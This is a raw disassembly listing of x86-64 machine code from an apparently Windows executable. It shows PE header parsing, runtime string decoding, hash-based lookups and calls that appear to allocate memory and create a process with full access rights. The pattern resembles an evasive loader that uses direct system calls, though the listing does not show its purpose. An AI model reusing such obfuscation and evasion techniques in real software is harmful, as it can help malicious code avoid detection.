   140002551:	49 c1 e0 03          	shl    $0x3,%r8
   140002555:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
   140002559:	31 d2                	xor    %edx,%edx
   14000255b:	eb 0c                	jmp    0x140002569
   14000255d:	0f 1f 00             	nopl   (%rax)
   140002560:	48 83 c2 28          	add    $0x28,%rdx
   140002564:	41 39 d0             	cmp    %edx,%r8d
   140002567:	74 1e                	je     0x140002587
   140002569:	44 8b 4c 10 0c       	mov    0xc(%rax,%rdx,1),%r9d
   14000256e:	4c 39 c9             	cmp    %r9,%rcx
   140002571:	72 ed                	jb     0x140002560
   140002573:	44 03 4c 10 08       	add    0x8(%rax,%rdx,1),%r9d
   140002578:	4c 39 c9             	cmp    %r9,%rcx
   14000257b:	73 e3                	jae    0x140002560
   14000257d:	8b 44 10 24          	mov    0x24(%rax,%rdx,1),%eax
   140002581:	f7 d0                	not    %eax
   140002583:	c1 e8 1f             	shr    $0x1f,%eax
   140002586:	c3                   	ret
   140002587:	31 c0                	xor    %eax,%eax
   140002589:	c3                   	ret
   14000258a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002590:	56                   	push   %rsi
   140002591:	48 8b 15 70 8a 00 00 	mov    0x8a70(%rip),%rdx        # 0x14000b008
   140002598:	0f b7 02             	movzwl (%rdx),%eax
   14000259b:	3d 4d 5a 00 00       	cmp    $0x5a4d,%eax
   1400025a0:	0f 85 87 00 00 00    	jne    0x14000262d
   1400025a6:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   1400025aa:	81 3c 02 50 45 00 00 	cmpl   $0x4550,(%rdx,%rax,1)
   1400025b1:	75 7a                	jne    0x14000262d
   1400025b3:	48 01 d0             	add    %rdx,%rax
   1400025b6:	44 0f b7 40 18       	movzwl 0x18(%rax),%r8d
   1400025bb:	41 81 f8 0b 02 00 00 	cmp    $0x20b,%r8d
   1400025c2:	75 69                	jne    0x14000262d
   1400025c4:	44 8b 80 90 00 00 00 	mov    0x90(%rax),%r8d
   1400025cb:	4d 85 c0             	test   %r8,%r8
   1400025ce:	74 5d                	je     0x14000262d
   1400025d0:	44 0f b7 48 06       	movzwl 0x6(%rax),%r9d
   1400025d5:	4d 85 c9             	test   %r9,%r9
   1400025d8:	74 53                	je     0x14000262d
   1400025da:	44 0f b7 50 14       	movzwl 0x14(%rax),%r10d
   1400025df:	49 c1 e1 03          	shl    $0x3,%r9
   1400025e3:	4f 8d 0c 89          	lea    (%r9,%r9,4),%r9
   1400025e7:	49 01 c2             	add    %rax,%r10
   1400025ea:	49 83 c2 24          	add    $0x24,%r10
   1400025ee:	31 c0                	xor    %eax,%eax
   1400025f0:	45 31 db             	xor    %r11d,%r11d
   1400025f3:	eb 14                	jmp    0x140002609
   1400025f5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400025fc:	00 00 00 00 
   140002600:	49 83 c3 28          	add    $0x28,%r11
   140002604:	45 39 d9             	cmp    %r11d,%r9d
   140002607:	74 26                	je     0x14000262f
   140002609:	43 8b 34 1a          	mov    (%r10,%r11,1),%esi
   14000260d:	44 39 c6             	cmp    %r8d,%esi
   140002610:	77 ee                	ja     0x140002600
   140002612:	43 03 74 1a fc       	add    -0x4(%r10,%r11,1),%esi
   140002617:	44 39 c6             	cmp    %r8d,%esi
   14000261a:	76 e4                	jbe    0x140002600
   14000261c:	4c 01 c2             	add    %r8,%rdx
   14000261f:	48 83 c2 0c          	add    $0xc,%rdx
   140002623:	31 c0                	xor    %eax,%eax
   140002625:	83 7a f8 00          	cmpl   $0x0,-0x8(%rdx)
   140002629:	75 26                	jne    0x140002651
   14000262b:	eb 1f                	jmp    0x14000264c
   14000262d:	31 c0                	xor    %eax,%eax
   14000262f:	5e                   	pop    %rsi
   140002630:	c3                   	ret
   140002631:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140002638:	0f 1f 84 00 00 00 00 
   14000263f:	00 
   140002640:	ff c9                	dec    %ecx
   140002642:	48 83 c2 14          	add    $0x14,%rdx
   140002646:	83 7a f8 00          	cmpl   $0x0,-0x8(%rdx)
   14000264a:	75 05                	jne    0x140002651
   14000264c:	83 3a 00             	cmpl   $0x0,(%rdx)
   14000264f:	74 de                	je     0x14000262f
   140002651:	85 c9                	test   %ecx,%ecx
   140002653:	7f eb                	jg     0x140002640
   140002655:	8b 02                	mov    (%rdx),%eax
   140002657:	48 03 05 aa 89 00 00 	add    0x89aa(%rip),%rax        # 0x14000b008
   14000265e:	eb cf                	jmp    0x14000262f
   140002660:	51                   	push   %rcx
   140002661:	50                   	push   %rax
   140002662:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002668:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   14000266d:	72 18                	jb     0x140002687
   14000266f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140002676:	48 85 09             	test   %rcx,(%rcx)
   140002679:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   14000267f:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002685:	77 e8                	ja     0x14000266f
   140002687:	48 29 c1             	sub    %rax,%rcx
   14000268a:	48 85 09             	test   %rcx,(%rcx)
   14000268d:	58                   	pop    %rax
   14000268e:	59                   	pop    %rcx
   14000268f:	c3                   	ret
   140002690:	41 57                	push   %r15
   140002692:	41 56                	push   %r14
   140002694:	41 55                	push   %r13
   140002696:	41 54                	push   %r12
   140002698:	56                   	push   %rsi
   140002699:	57                   	push   %rdi
   14000269a:	55                   	push   %rbp
   14000269b:	53                   	push   %rbx
   14000269c:	48 81 ec 58 03 00 00 	sub    $0x358,%rsp
   1400026a3:	0f 29 b4 24 40 03 00 	movaps %xmm6,0x340(%rsp)
   1400026aa:	00 
   1400026ab:	4d 89 ce             	mov    %r9,%r14
   1400026ae:	4c 89 c3             	mov    %r8,%rbx
   1400026b1:	49 89 d7             	mov    %rdx,%r15
   1400026b4:	48 89 8c 24 c0 00 00 	mov    %rcx,0xc0(%rsp)
   1400026bb:	00 
   1400026bc:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   1400026c3:	00 00 
   1400026c5:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   1400026cc:	00 00 
   1400026ce:	48 c7 84 24 d0 00 00 	movq   $0x0,0xd0(%rsp)
   1400026d5:	00 00 00 00 00 
   1400026da:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
   1400026e1:	00 00 00 00 00 
   1400026e6:	4c 8d 8c 24 98 00 00 	lea    0x98(%rsp),%r9
   1400026ed:	00 
   1400026ee:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400026f3:	31 d2                	xor    %edx,%edx
   1400026f5:	45 31 c0             	xor    %r8d,%r8d
   1400026f8:	e8 60 ee ff ff       	call   0x14000155d
   1400026fd:	85 c0                	test   %eax,%eax
   1400026ff:	0f 88 ef 00 00 00    	js     0x1400027f4
   140002705:	48 8b 3c 25 40 00 00 	mov    0x40,%rdi
   14000270c:	00 
   14000270d:	80 3d 5a 0b 2c 00 00 	cmpb   $0x0,0x2c0b5a(%rip)        # 0x1402c326e
   140002714:	0f 84 0d 06 00 00    	je     0x140002d27
   14000271a:	48 8d b4 24 38 01 00 	lea    0x138(%rsp),%rsi
   140002721:	00 
   140002722:	80 3d 81 0c 2c 00 00 	cmpb   $0x0,0x2c0c81(%rip)        # 0x1402c33aa
   140002729:	74 5a                	je     0x140002785
   14000272b:	66 0f 6f 05 5d 0c 2c 	movdqa 0x2c0c5d(%rip),%xmm0        # 0x1402c3390
   140002732:	00 
   140002733:	66 0f fd 05 25 8e 00 	paddw  0x8e25(%rip),%xmm0        # 0x14000b560
   14000273a:	00 
   14000273b:	66 0f db 05 2d 8e 00 	pand   0x8e2d(%rip),%xmm0        # 0x14000b570
   140002742:	00 
   140002743:	66 0f 7f 05 45 0c 2c 	movdqa %xmm0,0x2c0c45(%rip)        # 0x1402c3390
   14000274a:	00 
   14000274b:	f3 0f 7e 05 4d 0c 2c 	movq   0x2c0c4d(%rip),%xmm0        # 0x1402c33a0
   140002752:	00 
   140002753:	66 0f fd 05 25 8e 00 	paddw  0x8e25(%rip),%xmm0        # 0x14000b580
   14000275a:	00 
   14000275b:	66 0f db 05 2d 8e 00 	pand   0x8e2d(%rip),%xmm0        # 0x14000b590
   140002762:	00 
   140002763:	66 0f d6 05 35 0c 2c 	movq   %xmm0,0x2c0c35(%rip)        # 0x1402c33a0
   14000276a:	00 
   14000276b:	8b 05 37 0c 2c 00    	mov    0x2c0c37(%rip),%eax        # 0x1402c33a8
   140002771:	83 c0 2d             	add    $0x2d,%eax
   140002774:	0f b6 c0             	movzbl %al,%eax
   140002777:	66 89 05 2a 0c 2c 00 	mov    %ax,0x2c0c2a(%rip)        # 0x1402c33a8
   14000277e:	c6 05 25 0c 2c 00 00 	movb   $0x0,0x2c0c25(%rip)        # 0x1402c33aa
   140002785:	48 8d 15 04 0c 2c 00 	lea    0x2c0c04(%rip),%rdx        # 0x1402c3390
   14000278c:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   140002792:	48 89 f9             	mov    %rdi,%rcx
   140002795:	e8 f6 77 00 00       	call   0x140009f90
   14000279a:	c7 84 24 30 01 00 00 	movl   $0x30,0x130(%rsp)
   1400027a1:	30 00 00 00 
   1400027a5:	66 0f ef c0          	pxor   %xmm0,%xmm0
   1400027a9:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   1400027ad:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%rsi)
   1400027b4:	f3 0f 7f 46 18       	movdqu %xmm0,0x18(%rsi)
   1400027b9:	48 8b 04 25 50 00 00 	mov    0x50,%rax
   1400027c0:	00 
   1400027c1:	48 89 84 24 d8 00 00 	mov    %rax,0xd8(%rsp)
   1400027c8:	00 
   1400027c9:	48 c7 84 24 e0 00 00 	movq   $0x0,0xe0(%rsp)
   1400027d0:	00 00 00 00 00 
   1400027d5:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400027da:	4c 8d 84 24 30 01 00 	lea    0x130(%rsp),%r8
   1400027e1:	00 
   1400027e2:	4c 8d 8c 24 d8 00 00 	lea    0xd8(%rsp),%r9
   1400027e9:	00 
   1400027ea:	ba 80 00 00 00       	mov    $0x80,%edx
   1400027ef:	e8 f1 ec ff ff       	call   0x1400014e5
   1400027f4:	48 8d 94 24 d0 00 00 	lea    0xd0(%rsp),%rdx
   1400027fb:	00 
   1400027fc:	4c 8d 84 24 98 00 00 	lea    0x98(%rsp),%r8
   140002803:	00 
   140002804:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   14000280b:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002811:	e8 b1 ec ff ff       	call   0x1400014c7
   140002816:	48 83 7c 24 58 00    	cmpq   $0x0,0x58(%rsp)
   14000281c:	75 09                	jne    0x140002827
   14000281e:	48 c7 44 24 58 ff ff 	movq   $0xffffffffffffffff,0x58(%rsp)
   140002825:	ff ff 
   140002827:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   14000282c:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002833:	ba 03 00 00 00       	mov    $0x3,%edx
   140002838:	e8 c6 ec ff ff       	call   0x140001503
   14000283d:	b9 f2 da b3 0d       	mov    $0xdb3daf2,%ecx
   140002842:	e8 f9 71 00 00       	call   0x140009a40
   140002847:	89 c0                	mov    %eax,%eax
   140002849:	65 48 8b 00          	mov    %gs:(%rax),%rax
   14000284d:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140002854:	00 
   140002855:	48 8d 8c 24 30 01 00 	lea    0x130(%rsp),%rcx
   14000285c:	00 
   14000285d:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140002863:	31 d2                	xor    %edx,%edx
   140002865:	e8 f6 77 00 00       	call   0x14000a060
   14000286a:	80 3d fe 09 2c 00 00 	cmpb   $0x0,0x2c09fe(%rip)        # 0x1402c326f
   140002871:	0f 84 6a 04 00 00    	je     0x140002ce1
   140002877:	80 3d 3c 0b 2c 00 00 	cmpb   $0x0,0x2c0b3c(%rip)        # 0x1402c33ba
   14000287e:	74 3c                	je     0x1400028bc
   140002880:	f3 0f 7e 05 28 0b 2c 	movq   0x2c0b28(%rip),%xmm0        # 0x1402c33b0
   140002887:	00 
   140002888:	66 0f fd 05 10 8d 00 	paddw  0x8d10(%rip),%xmm0        # 0x14000b5a0
   14000288f:	00 
   140002890:	66 0f db 05 f8 8c 00 	pand   0x8cf8(%rip),%xmm0        # 0x14000b590
   140002897:	00 
   140002898:	66 0f d6 05 10 0b 2c 	movq   %xmm0,0x2c0b10(%rip)        # 0x1402c33b0
   14000289f:	00 
   1400028a0:	b8 bf 00 00 00       	mov    $0xbf,%eax
   1400028a5:	03 05 0d 0b 2c 00    	add    0x2c0b0d(%rip),%eax        # 0x1402c33b8
   1400028ab:	0f b6 c0             	movzbl %al,%eax
   1400028ae:	66 89 05 03 0b 2c 00 	mov    %ax,0x2c0b03(%rip)        # 0x1402c33b8
   1400028b5:	c6 05 fe 0a 2c 00 00 	movb   $0x0,0x2c0afe(%rip)        # 0x1402c33ba
   1400028bc:	48 8d 15 ed 0a 2c 00 	lea    0x2c0aed(%rip),%rdx        # 0x1402c33b0
   1400028c3:	48 8d b4 24 30 01 00 	lea    0x130(%rsp),%rsi
   1400028ca:	00 
   1400028cb:	48 89 f1             	mov    %rsi,%rcx
   1400028ce:	e8 9d 76 00 00       	call   0x140009f70
   1400028d3:	48 89 f1             	mov    %rsi,%rcx
   1400028d6:	4c 89 fa             	mov    %r15,%rdx
   1400028d9:	e8 82 76 00 00       	call   0x140009f60
   1400028de:	48 89 f1             	mov    %rsi,%rcx
   1400028e1:	e8 9a 76 00 00       	call   0x140009f80
   1400028e6:	49 89 c7             	mov    %rax,%r15
   1400028e9:	4d 85 f6             	test   %r14,%r14
   1400028ec:	74 2c                	je     0x14000291a
   1400028ee:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   1400028f3:	4c 89 f1             	mov    %r14,%rcx
   1400028f6:	e8 85 76 00 00       	call   0x140009f80
   1400028fb:	48 8d 0c 45 02 00 00 	lea    0x2(,%rax,2),%rcx
   140002902:	00 
   140002903:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140002908:	48 b9 00 00 0b 08 e0 	movabs $0x6ede64e0080b0000,%rcx
   14000290f:	64 de 6e 
   140002912:	4c 8d 24 41          	lea    (%rcx,%rax,2),%r12
   140002916:	31 ff                	xor    %edi,%edi
   140002918:	eb 35                	jmp    0x14000294f
   14000291a:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140002921:	00 
   140002922:	48 8b 40 20          	mov    0x20(%rax),%rax
   140002926:	48 8b 48 38          	mov    0x38(%rax),%rcx
   14000292a:	48 8b 40 40          	mov    0x40(%rax),%rax
   14000292e:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140002933:	48 89 c8             	mov    %rcx,%rax
   140002936:	48 c1 e8 10          	shr    $0x10,%rax
   14000293a:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000293f:	48 bf 00 00 00 00 ff 	movabs $0xffffffff00000000,%rdi
   140002946:	ff ff ff 
   140002949:	49 89 cc             	mov    %rcx,%r12
   14000294c:	48 21 cf             	and    %rcx,%rdi
   14000294f:	48 8b 8c 24 c0 03 00 	mov    0x3c0(%rsp),%rcx
   140002956:	00 
   140002957:	4e 8d 34 7d 02 00 00 	lea    0x2(,%r15,2),%r14
   14000295e:	00 
   14000295f:	4d 01 ff             	add    %r15,%r15
   140002962:	48 85 db             	test   %rbx,%rbx
   140002965:	74 1e                	je     0x140002985
   140002967:	48 89 ce             	mov    %rcx,%rsi
   14000296a:	48 89 d9             	mov    %rbx,%rcx
   14000296d:	e8 0e 76 00 00       	call   0x140009f80
   140002972:	48 89 f1             	mov    %rsi,%rcx
   140002975:	49 89 c5             	mov    %rax,%r13
   140002978:	48 8d 2c 45 02 00 00 	lea    0x2(,%rax,2),%rbp
   14000297f:	00 
   140002980:	49 01 c5             	add    %rax,%r13
   140002983:	eb 0f                	jmp    0x140002994
   140002985:	44 89 f5             	mov    %r14d,%ebp
   140002988:	81 e5 fe ff 00 00    	and    $0xfffe,%ebp
   14000298e:	48 89 f3             	mov    %rsi,%rbx
   140002991:	4d 89 fd             	mov    %r15,%r13
   140002994:	48 89 9c 24 b8 00 00 	mov    %rbx,0xb8(%rsp)
   14000299b:	00 
   14000299c:	48 85 c9             	test   %rcx,%rcx
   14000299f:	75 38                	jne    0x1400029d9
   1400029a1:	80 3d c8 08 2c 00 00 	cmpb   $0x0,0x2c08c8(%rip)        # 0x1402c3270
   1400029a8:	0f 84 c2 03 00 00    	je     0x140002d70
   1400029ae:	48 8d 0d 07 0a 2c 00 	lea    0x2c0a07(%rip),%rcx        # 0x1402c33bc
   1400029b5:	80 3d 02 0a 2c 00 00 	cmpb   $0x0,0x2c0a02(%rip)        # 0x1402c33be
   1400029bc:	74 1b                	je     0x1400029d9
   1400029be:	0f b7 05 f7 09 2c 00 	movzwl 0x2c09f7(%rip),%eax        # 0x1402c33bc
   1400029c5:	83 c0 39             	add    $0x39,%eax
   1400029c8:	0f b6 c0             	movzbl %al,%eax
   1400029cb:	66 89 05 ea 09 2c 00 	mov    %ax,0x2c09ea(%rip)        # 0x1402c33bc
   1400029d2:	c6 05 e5 09 2c 00 00 	movb   $0x0,0x2c09e5(%rip)        # 0x1402c33be
   1400029d9:	41 81 e5 fe ff 00 00 	and    $0xfffe,%r13d
   1400029e0:	48 89 8c 24 b0 00 00 	mov    %rcx,0xb0(%rsp)
   1400029e7:	00 
   1400029e8:	e8 93 75 00 00       	call   0x140009f80
   1400029ed:	48 89 c3             	mov    %rax,%rbx
   1400029f0:	01 c0                	add    %eax,%eax
   1400029f2:	41 0f b7 f4          	movzwl %r12w,%esi
   1400029f6:	41 81 e7 fe ff 00 00 	and    $0xfffe,%r15d
   1400029fd:	4c 89 bc 24 a0 00 00 	mov    %r15,0xa0(%rsp)
   140002a04:	00 
   140002a05:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   140002a0c:	00 
   140002a0d:	49 8b 4c 24 20       	mov    0x20(%r12),%rcx
   140002a12:	0f b7 49 50          	movzwl 0x50(%rcx),%ecx
   140002a16:	0f b7 d0             	movzwl %ax,%edx
   140002a19:	48 89 94 24 a8 00 00 	mov    %rdx,0xa8(%rsp)
   140002a20:	00 
   140002a21:	4a 8d 04 2e          	lea    (%rsi,%r13,1),%rax
   140002a25:	4c 01 f8             	add    %r15,%rax
   140002a28:	48 01 d1             	add    %rdx,%rcx
   140002a2b:	4c 8d 3c 08          	lea    (%rax,%rcx,1),%r15
   140002a2f:	49 81 c7 16 04 00 00 	add    $0x416,%r15
   140002a36:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   140002a3d:	00 00 
   140002a3f:	4c 89 bc 24 90 00 00 	mov    %r15,0x90(%rsp)
   140002a46:	00 
   140002a47:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002a4e:	00 
   140002a4f:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140002a56:	00 
   140002a57:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140002a5c:	4c 8d 8c 24 90 00 00 	lea    0x90(%rsp),%r9
   140002a63:	00 
   140002a64:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002a6b:	45 31 c0             	xor    %r8d,%r8d
   140002a6e:	e8 36 ea ff ff       	call   0x1400014a9
   140002a73:	4c 89 e1             	mov    %r12,%rcx
   140002a76:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140002a7b:	45 89 3c 24          	mov    %r15d,(%r12)
   140002a7f:	45 89 7c 24 04       	mov    %r15d,0x4(%r12)
   140002a84:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140002a89:	c1 e0 10             	shl    $0x10,%eax
   140002a8c:	48 09 c7             	or     %rax,%rdi
   140002a8f:	48 09 f7             	or     %rsi,%rdi
   140002a92:	41 c7 44 24 08 01 00 	movl   $0x1,0x8(%r12)
   140002a99:	00 00 
   140002a9b:	49 c7 44 24 10 fd ff 	movq   $0xfffffffffffffffd,0x10(%r12)
   140002aa2:	ff ff 
   140002aa4:	49 89 7c 24 38       	mov    %rdi,0x38(%r12)
   140002aa9:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140002aae:	49 89 44 24 40       	mov    %rax,0x40(%r12)
   140002ab3:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002ab7:	0f 10 40 50          	movups 0x50(%rax),%xmm0
   140002abb:	41 0f 11 44 24 50    	movups %xmm0,0x50(%r12)
   140002ac1:	41 83 e6 fe          	and    $0xfffffffe,%r14d
   140002ac5:	41 c1 e6 10          	shl    $0x10,%r14d
   140002ac9:	4c 8b bc 24 a0 00 00 	mov    0xa0(%rsp),%r15
   140002ad0:	00 
   140002ad1:	4d 09 fe             	or     %r15,%r14
   140002ad4:	4d 89 74 24 60       	mov    %r14,0x60(%r12)
   140002ad9:	c1 e5 10             	shl    $0x10,%ebp
   140002adc:	4c 09 ed             	or     %r13,%rbp
   140002adf:	48 8d bc 24 30 01 00 	lea    0x130(%rsp),%rdi
   140002ae6:	00 
   140002ae7:	49 89 7c 24 68       	mov    %rdi,0x68(%r12)
   140002aec:	49 89 6c 24 70       	mov    %rbp,0x70(%r12)
   140002af1:	48 8b 84 24 b8 00 00 	mov    0xb8(%rsp),%rax
   140002af8:	00 
   140002af9:	49 89 44 24 78       	mov    %rax,0x78(%r12)
   140002afe:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002b02:	48 8b 80 80 00 00 00 	mov    0x80(%rax),%rax
   140002b09:	49 89 84 24 80 00 00 	mov    %rax,0x80(%r12)
   140002b10:	00 
   140002b11:	c1 e3 11             	shl    $0x11,%ebx
   140002b14:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   140002b1b:	00 
   140002b1c:	01 d8                	add    %ebx,%eax
   140002b1e:	05 00 00 02 00       	add    $0x20000,%eax
   140002b23:	49 89 84 24 d0 00 00 	mov    %rax,0xd0(%r12)
   140002b2a:	00 
   140002b2b:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
   140002b32:	00 
   140002b33:	49 89 84 24 d8 00 00 	mov    %rax,0xd8(%r12)
   140002b3a:	00 
   140002b3b:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002b3f:	48 8b 80 f0 03 00 00 	mov    0x3f0(%rax),%rax
   140002b46:	49 89 84 24 f0 03 00 	mov    %rax,0x3f0(%r12)
   140002b4d:	00 
   140002b4e:	0f 57 f6             	xorps  %xmm6,%xmm6
   140002b51:	0f 11 b4 24 20 01 00 	movups %xmm6,0x120(%rsp)
   140002b58:	00 
   140002b59:	0f 11 b4 24 10 01 00 	movups %xmm6,0x110(%rsp)
   140002b60:	00 
   140002b61:	0f 11 b4 24 00 01 00 	movups %xmm6,0x100(%rsp)
   140002b68:	00 
   140002b69:	0f 11 b4 24 f0 00 00 	movups %xmm6,0xf0(%rsp)
   140002b70:	00 
   140002b71:	0f 11 b4 24 e0 00 00 	movups %xmm6,0xe0(%rsp)
   140002b78:	00 
   140002b79:	48 c7 84 24 d8 00 00 	movq   $0x58,0xd8(%rsp)
   140002b80:	00 58 00 00 00 
   140002b85:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
   140002b8c:	00 00 00 00 00 
   140002b91:	48 c7 84 24 c8 00 00 	movq   $0x60,0xc8(%rsp)
   140002b98:	00 60 00 00 00 
   140002b9d:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002ba4:	00 
   140002ba5:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140002bac:	00 
   140002bad:	48 8d 9c 24 88 00 00 	lea    0x88(%rsp),%rbx
   140002bb4:	00 
   140002bb5:	48 8d b4 24 c8 00 00 	lea    0xc8(%rsp),%rsi
   140002bbc:	00 
   140002bbd:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002bc4:	48 89 da             	mov    %rbx,%rdx
   140002bc7:	45 31 c0             	xor    %r8d,%r8d
   140002bca:	49 89 f1             	mov    %rsi,%r9
   140002bcd:	e8 d7 e8 ff ff       	call   0x1400014a9
   140002bd2:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140002bd9:	00 
   140002bda:	48 c7 00 68 00 00 00 	movq   $0x68,(%rax)
   140002be1:	48 c7 40 08 05 00 02 	movq   $0x20005,0x8(%rax)
   140002be8:	00 
   140002be9:	4c 89 78 10          	mov    %r15,0x10(%rax)
   140002bed:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140002bf1:	48 c7 40 28 00 00 06 	movq   $0x60000,0x28(%rax)
   140002bf8:	00 
   140002bf9:	48 c7 40 30 08 00 00 	movq   $0x8,0x30(%rax)
   140002c00:	00 
   140002c01:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140002c06:	48 89 48 38          	mov    %rcx,0x38(%rax)
   140002c0a:	48 c7 40 48 02 00 06 	movq   $0x60002,0x48(%rax)
   140002c11:	00 
   140002c12:	48 c7 40 50 08 00 00 	movq   $0x8,0x50(%rax)
   140002c19:	00 
   140002c1a:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002c1f:	48 89 48 58          	mov    %rcx,0x58(%rax)
   140002c23:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   140002c2a:	00 
   140002c2b:	0f 11 31             	movups %xmm6,(%rcx)
   140002c2e:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140002c35:	00 
   140002c36:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   140002c3a:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002c3f:	48 8d 84 24 d8 00 00 	lea    0xd8(%rsp),%rax
   140002c46:	00 
   140002c47:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002c4c:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140002c51:	8b 84 24 c8 03 00 00 	mov    0x3c8(%rsp),%eax
   140002c58:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140002c5c:	0f 11 74 24 20       	movups %xmm6,0x20(%rsp)
   140002c61:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140002c68:	00 
   140002c69:	41 b8 ff ff 1f 00    	mov    $0x1fffff,%r8d
   140002c6f:	41 b9 ff ff 1f 00    	mov    $0x1fffff,%r9d
   140002c75:	e8 7a e8 ff ff       	call   0x1400014f4
   140002c7a:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002c81:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140002c86:	4c 8d 84 24 90 00 00 	lea    0x90(%rsp),%r8
   140002c8d:	00 
   140002c8e:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002c94:	e8 2e e8 ff ff       	call   0x1400014c7
   140002c99:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002ca0:	48 89 da             	mov    %rbx,%rdx
   140002ca3:	49 89 f0             	mov    %rsi,%r8
   140002ca6:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002cac:	e8 16 e8 ff ff       	call   0x1400014c7
   140002cb1:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002cb6:	e8 a3 e7 ff ff       	call   0x14000145e
   140002cbb:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140002cc0:	e8 99 e7 ff ff       	call   0x14000145e
   140002cc5:	0f 28 b4 24 40 03 00 	movaps 0x340(%rsp),%xmm6
   140002ccc:	00 
   140002ccd:	48 81 c4 58 03 00 00 	add    $0x358,%rsp
   140002cd4:	5b                   	pop    %rbx
   140002cd5:	5d                   	pop    %rbp
   140002cd6:	5f                   	pop    %rdi
   140002cd7:	5e                   	pop    %rsi
   140002cd8:	41 5c                	pop    %r12
   140002cda:	41 5d                	pop    %r13
   140002cdc:	41 5e                	pop    %r14
   140002cde:	41 5f                	pop    %r15
   140002ce0:	c3                   	ret
   140002ce1:	c6 05 d2 06 2c 00 01 	movb   $0x1,0x2c06d2(%rip)        # 0x1402c33ba
   140002ce8:	48 b8 9d 00 80 00 80 	movabs $0x9d00800080009d,%rax
   140002cef:	00 9d 00 
   140002cf2:	48 89 05 b7 06 2c 00 	mov    %rax,0x2c06b7(%rip)        # 0x1402c33b0
   140002cf9:	66 c7 05 b6 06 2c 00 	movw   $0x41,0x2c06b6(%rip)        # 0x1402c33b8
   140002d00:	41 00 
   140002d02:	48 8d 0d b7 00 00 00 	lea    0xb7(%rip),%rcx        # 0x140002dc0
   140002d09:	e8 62 e6 ff ff       	call   0x140001370
   140002d0e:	c6 05 5a 05 2c 00 01 	movb   $0x1,0x2c055a(%rip)        # 0x1402c326f
   140002d15:	80 3d 9e 06 2c 00 00 	cmpb   $0x0,0x2c069e(%rip)        # 0x1402c33ba
   140002d1c:	0f 85 5e fb ff ff    	jne    0x140002880
   140002d22:	e9 95 fb ff ff       	jmp    0x1400028bc
   140002d27:	c6 05 7c 06 2c 00 01 	movb   $0x1,0x2c067c(%rip)        # 0x1402c33aa
   140002d2e:	66 0f 6f 05 1a 88 00 	movdqa 0x881a(%rip),%xmm0        # 0x14000b550
   140002d35:	00 
   140002d36:	66 0f 7f 05 52 06 2c 	movdqa %xmm0,0x2c0652(%rip)        # 0x1402c3390
